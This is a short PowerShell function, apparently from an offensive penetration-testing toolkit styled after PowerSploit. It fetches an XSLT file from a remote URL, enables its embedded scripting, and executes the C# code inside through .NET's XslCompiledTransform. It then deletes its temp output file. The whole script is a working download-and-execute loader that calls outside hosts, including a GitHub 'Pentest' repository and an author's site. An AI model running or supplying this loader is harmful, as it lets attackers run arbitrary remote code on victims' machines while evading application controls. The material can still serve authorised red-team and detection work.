Function xslt_exec
{
<#
.SYNOPSIS
Execute C# From XSLT.
PowerSploit Function: Xslt_exec
Author: Evi1cg (@evi1cg)
.DESCRIPTION
Use this script can execute c# from xslt file
.PARAMETER xslt_url
The xslt url to use
.EXAMPLE
C:\PS> xslt_exec -xslt_url https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/xslt/calc.xslt
#>
    [CmdletBinding()]
    param
    (
        [Parameter(ParameterSetName = 'xslt_url')]
        [string]$xslt_url
    )
    $xslt_settings = new-object System.XML.XSl.XsltSettings
    $xslt_settings.EnableScript = $true
    $xslt = new-object System.XML.Xsl.XslCompiledTransform
    $XmlResolver = new-object System.XML.XmlUrlResolver
    #$xslt_url = "http://evi1cg.me/scripts/calc.xslt"
    $xslt.Load($xslt_url,$xslt_settings, $XmlResolver)
    $doc =  new-object -Type System.Xml.XPath.XPathDocument("https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/xslt/example.xml")
    $settings = new-object System.XML.XMLWriterSettings
    $settings.OmitXmlDeclaration = $true
    $settings.Indent = $true
    $writer = [System.XML.XmlWriter]::Create("$env:Temp\output.xml", $settings)
    $xslt.Transform($doc,$writer)
    $writer.Close()
    if(Test-Path $($env:Temp+'\output.xml')){
                Remove-Item -Recurse -Force  $($env:Temp+'\output.xml')
            }
}